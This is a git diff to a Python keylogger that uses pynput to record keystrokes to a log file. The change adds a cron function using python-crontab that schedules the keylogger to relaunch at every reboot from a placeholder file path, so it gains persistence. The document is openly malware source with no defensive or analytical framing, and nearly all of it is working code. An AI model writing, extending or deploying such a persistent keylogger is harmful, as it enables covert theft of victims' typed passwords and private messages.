@@ -2,13 +2,12 @@
 
 #Import Key and Listener module
 from pynput.keyboard import Key, Listener
-from cron import cron
+from crontab import CronTab
 
 count = 0
 keys = []
 #Without this Error will coccur if we try to call a boolean Value as a function
 my_bool = False
-cron()
 
 # print the key strokes to the log file
 #when key is pressed
@@ -28,7 +27,13 @@ def on_press(key):
     write_file(keys)
     #Resets keys
     keys = []
-
+    
+def cron():
+    my_cron = CronTab(user=True)
+    job = my_cron.new(command='python <FILEPATH>')  # edit filepath to location of keylogger download
+    job.every_reboot()
+    my_cron.write()
+    
 #write to a file
 #text file can be named how you see fit
 def write_file(key):
@@ -41,6 +46,8 @@ def write_file(key):
 def on_release(key):
   if key==Key.esc:
     return my_bool
+  
+cron()
     
 #Will continously loop through until broken
 with Listener(on_press=on_press, on_release=on_release) as listener:
